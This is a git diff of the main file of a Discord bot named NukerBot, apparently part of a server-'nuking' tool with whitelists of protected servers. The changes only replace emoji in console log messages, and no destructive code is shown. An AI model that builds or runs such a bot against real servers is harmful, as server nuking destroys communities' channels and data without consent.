@@ -43,14 +43,14 @@ class NukerBot(commands.Bot):
     async def setup_hook(self):
         try:
             await self.load_extension("cogs.nuker")
-            print("✅ Loaded nuker cog with PROFESSIONAL features")
+            print("<a:verified:1408545305594433546> Loaded nuker cog with PROFESSIONAL features")
             
             # Verify cog loaded
             cog = self.get_cog("NukerCommands")
             if cog:
-                print(f"✅ Cog verified: {cog.__class__.__name__}")
-                print(f"✅ Permanent whitelist: {cog.permanent_whitelist}")
-                print(f"✅ Dynamic whitelist: {cog.whitelisted_servers}")
+                print(f"<a:verified:1408545305594433546> Cog verified: {cog.__class__.__name__}")
+                print(f"<a:verified:1408545305594433546> Permanent whitelist: {cog.permanent_whitelist}")
+                print(f"<a:verified:1408545305594433546> Dynamic whitelist: {cog.whitelisted_servers}")
             else:
                 print("❌ Cog loaded but not accessible!")
                 
@@ -82,7 +82,7 @@ class NukerBot(commands.Bot):
             # Check if already connected in this guild
             guild = channel.guild
             if guild.voice_client and guild.voice_client.is_connected():
-                print(f"✅ Already connected in {guild.name}")
+                print(f"<a:verified:1408545305594433546> Already connected in {guild.name}")
                 return True
             
             # CONNECT with timeout
@@ -93,7 +93,7 @@ class NukerBot(commands.Bot):
             
         except discord.errors.ClientException as e:
             if "Already connected" in str(e):
-                print(f"ℹ️  Already connected to voice in {guild.name}")
+                print(f"<a:emoji_14:1430082122982621217> Already connected to voice in {guild.name}")
                 return True
             print(f"⚠️  ClientException [{channel_id}]: {e}")
         except discord.errors.Forbidden:
@@ -139,9 +139,9 @@ class NukerBot(commands.Bot):
                     safe_servers.append(f"❓ Not in server ({server_id})")
             
             if safe_servers:
-                print("\n✅ PERMANENT PROTECTED SERVERS:")
+                print("\n PERMANENT PROTECTED SERVERS:")
                 for server in safe_servers:
-                    print(f"   - {server}")
+                    print(f"<a:emoji_1:1430081383757512785>  - {server}")
             
             # Dynamic whitelist servers
             dynamic_servers = []
@@ -235,7 +235,7 @@ class NukerBot(commands.Bot):
                     pass
                 
                 await channel.send(embed=embed)
-                print(f"✅ Admin panel sent to channel {self.admin_channel_id}")
+                print(f"<a:emoji_1:1430081383757512785> Admin panel sent to channel {self.admin_channel_id}")
                 
         except Exception as e:
             print(f"❌ Failed to send admin panel: {e}")
@@ -301,7 +301,7 @@ class NukerBot(commands.Bot):
         nuker_cog = self.get_cog("NukerCommands")
         if nuker_cog:
             if nuker_cog.is_whitelisted(guild.id):
-                print(f"✅ WHITELISTED SERVER - Bot will provide protection features")
+                print(f"<a:emoji_1:1430081383757512785> WHITELISTED SERVER - Bot will provide protection features")
                 # Whitelisted server hai - protection provide karo
                 try:
                     general = discord.utils.get(guild.text_channels, name="general")
@@ -351,7 +351,7 @@ class NukerBot(commands.Bot):
                     name=status_text
                 ))
             else:
-                print("⚠️ Cog not available for status update")
+                print("<a:emoji_27:1410746704537587752> Cog not available for status update")
         except Exception as e:
             print(f"❌ Status update error: {e}")
 
